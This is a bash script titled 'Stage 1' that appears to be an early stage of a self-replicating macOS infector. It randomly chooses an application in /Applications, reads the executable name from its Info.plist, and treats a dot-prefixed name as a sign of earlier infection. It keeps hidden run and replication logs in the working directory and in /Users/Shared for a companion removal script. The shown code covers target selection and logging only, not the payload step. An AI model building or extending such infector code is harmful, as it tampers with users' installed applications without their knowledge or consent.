#!/bin/bash
#sed -E/-e fix is thanks to https://stackoverflow.com/a/28072266/
#Stage 1, re-written:
DEBUG=1
#LOGGING isn't dependant anymore on DEBUG being enabled (1)
LOGGING=1
#Do not run this script in /Users/Shared/, as the logging would mess with the log
#for removal.sh
Path=$(pwd)
if [ -f ./.stage-1.log ] && [ ${Path} != "/Users/Shared/" ] && [ ${LOGGING} == 1 ]
then
	#For some reason the -e (not -E) is neccesary here
	RC01=$(sed -ne "1s/.*\(.\)$/\1/p" ./.stage-1.log)
	RC02=${RC01}
	let "RC02++"
	sed -in "1s/${RC01}/${RC02}/" ./.stage-1.log
	echo "" >> ./.stage-1.log
else
	#Create local log and a run count (to be edited at the end)
	touch ./.stage-1.log
	echo "Run count: 1" >> ./.stage-1.log
	echo "Replication count: 0" >> ./.stage-1.log
	echo "" >> ./.stage-1.log
fi
if [ ${Path} == "/Users/Shared" ] && [ ${LOGGING} == 1 ]
then
	if [ ${DEBUG} == 1 ]
	then
		echo "Unable to run in ${Path} with LOGGING set to ${LOGGING}"
		echo "This is to protect the integrity of the log used for removal of stage 1"
	fi
	exit 0
fi
#The $0 in $Script prints the script name, except it starts with ./
#The solution for this is to add a forward slash right before it.
Script=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )/$0
if [ ${DEBUG} == 1 ]
then
	echo "Script is ${Script}"
fi
if [ ${LOGGING} == 1 ]
then
	echo "Script is ${Script}" >> ./.stage-1.log
fi
#It appears that some plists are gibberish for some reason, they can be identified 
#by ${ExecLineNum} having a value of 1 (after let adding one to its value)
IsReadablePlist="false"
IsAlreadyPresent="false"
while [ ${IsReadablePlist} == "false" ] && [ ${IsAlreadyPresent} == "false" ] 
do
	#Application roulette; coppied from stage-1-old:
	loc=(/Applications/*)
	Target="${loc[RANDOM % ${#loc[@]}]}"
	TargetPlist="${Target}/Contents/Info.plist"
	if [ ${DEBUG} == 1 ]
	then
		echo "Target is ${Target}"
		echo "TargetPlist is ${TargetPlist}"
	fi
	if [ ${LOGGING} == 1 ]
	then
		echo "Target is ${Target}" >> ./.stage-1.log
		echo "TargetPlist is ${TargetPlist}" >> ./.stage-1.log
	fi
	#Using sed to get the line number where the executable name is stored in the
	#target application's Info.plist (by looking for CFBundleExecutable and then
	#adding 1):
	ExecLineNum=$(sed -n "/CFBundleExecutable/=" "${TargetPlist}")
	let "ExecLineNum++"
	if [ ${DEBUG} == 1 ]
	then
		echo "ExecLineNum is ${ExecLineNum}"
	fi
	if [ ${LOGGING} == 1 ]
	then
		echo "ExecLineNum is ${ExecLineNum}" >> ./.stage-1.log
	fi
	if [ ${ExecLineNum} == 1 ]
	then
		if [ ${DEBUG} == 1 ]
		then
			echo "IsReadablePlist == false"
		fi
		if [ ${LOGGING} == 1 ]
		then
			echo "IsReadablePlist == false" >> ./.stage-1.log
		fi
		IsReadablePlist="false"
	else
		ExecLineFull=$(sed -n "${ExecLineNum}p" "${TargetPlist}")
		TmpName=$RANDOM
		echo "${ExecLineFull}" >> "/private/tmp/${TmpName}"
		if [ ${DEBUG} == 1 ]
		then
			echo "ExecLineFull is ${ExecLineFull}"
			echo "TmpName is ${TmpName}"
			echo "TmpName file is /private/tmp/${TmpName}"
		fi
		if [ ${LOGGING} == 1 ]
		then
			echo "ExecLineFull is ${ExecLineFull}" >> ./.stage-1.log
			echo "TmpName is ${TmpName}" >> ./.stage-1.log
			echo "TmpName file is /private/tmp/${TmpName}" >> ./.stage-1.log
		fi
		#For some reason the -E (not -e) is neccesary here:
		ExecName=$(sed -nE "/<string>/ s/.*<string>([^<]+).*/\1/p" "/private/tmp/${TmpName}")
		if [ ${DEBUG} == 1 ]
		then
			echo "ExecName is ${ExecName}"
		fi
		if [ ${LOGGING} == 1 ]
		then
			echo "ExecName is ${ExecName}" >> ./.stage-1.log
		fi
		rm "/private/tmp/${TmpName}"
		if [ ! -f "/private/tmp/${TmpName}" ]
		then
			if [ ${DEBUG} == 1 ]
			then
				echo "TmpName file deleted"
			fi
			if [ ${LOGGING} == 1 ]
			then
				echo "TmpName file deleted" >> ./.stage-1.log
			fi
		fi
		#If ${ExecName} starts with a . (aka is hidden) then repeat this loop
		if [[ ${ExecName} = .* ]]
		then
			if [ ${DEBUG} == 1 ]
			then
				echo "IsAlreadyPresent == true"
			fi
			if [ ${LOGGING} == 1 ]
			then
				echo "IsAlreadyPresent == true" >> ./.stage-1.log
			fi
			IsAlreadyPresent="true"
		fi
		if [ ${DEBUG} == 1 ]
		then
			echo "IsReadablePlist == true"
		fi
		if [ ${LOGGING} == 1 ]
		then
			echo "IsReadablePlist == true" >> ./.stage-1.log
		fi
		IsReadablePlist="true"
	fi
done
#Check for stage 1 log/info file (/Users/Shared/.stage-1.log)
#This location was chosen because all other non-commonly-visited [but always
#present] directories [other than /private/tmp/, but that's temporary] require
#sudo/root perms)
#./.stage-1.log is for script logging, and /Users/Shared/.stage-1.log is for
#being read by removal.sh
if [ -f /Users/Shared/.stage-1.log ]
then
	if [ ${DEBUG} == 1 ]
	then
		echo "/Users/Shared/.stage-1.log present"
	fi
	if [ ${LOGGING} == 1 ]
	then
		echo "/Users/Shared/.stage-1.log present" >> ./.stage-1.log
	fi
else
	touch "/Users/Shared/.stage-1.log"
	echo "Replicated 0 times" >> "/Users/Shared/.stage-1.log"
	echo "" >> "/Users/Shared/.stage-1.log"
	if [ ${DEBUG} == 1 ]
	then
		echo "/Users/Shared/.stage-1.log not present"
		echo "/Users/Shared/.stage-1.log created"
	fi
	if [ ${LOGGING} == 1 ]
	then
		echo "/Users/Shared/.stage-1.log not present" >> ./.stage-1.log
		echo "/Users/Shared/.stage-1.log created" >> ./.stage-1.log
	fi
fi